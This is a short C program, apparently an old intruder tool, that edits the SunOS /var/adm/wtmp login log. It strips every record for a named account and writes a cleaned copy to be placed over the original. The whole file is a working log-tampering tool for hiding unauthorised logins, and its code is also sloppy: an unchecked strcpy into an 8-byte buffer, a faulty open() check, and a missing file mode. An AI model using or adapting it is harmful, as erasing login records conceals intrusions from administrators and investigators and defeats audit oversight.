/*
   /var/adm/wtmp editor for Sun's
   Written by gab, this will make a file wtmp.tmp then just copy
   it over /var/adm/wtmp and chmod 644 it
*/
 
#include <stdio.h>
#include <utmp.h>
#include <fcntl.h>
main(argc,argv)
int argc;
char *argv[];
{
	int fp=-1,fd=-1;
	struct utmp ut;
	int i=0;
	char name[8];
	if (argc!=3) 
	{ fprintf(stderr,"usage: %s accountname xtmp\n\r",argv[0]);  exit(2);}
	
	strcpy(name,argv[1]);
	
	if (fp=open(argv[2],O_RDONLY)) {
		fd=open("xtmp.tmp",O_WRONLY|O_CREAT);
		while (read(fp,&ut,sizeof(struct utmp))==sizeof(struct utmp)) {
			if (strncmp(ut.ut_name,name,strlen(name))) 
				write(fd,&ut,sizeof(struct utmp));
			i++;
		}
		close(fp);
		close(fd);
	}
	printf("Total: %d\n\r", i);
}
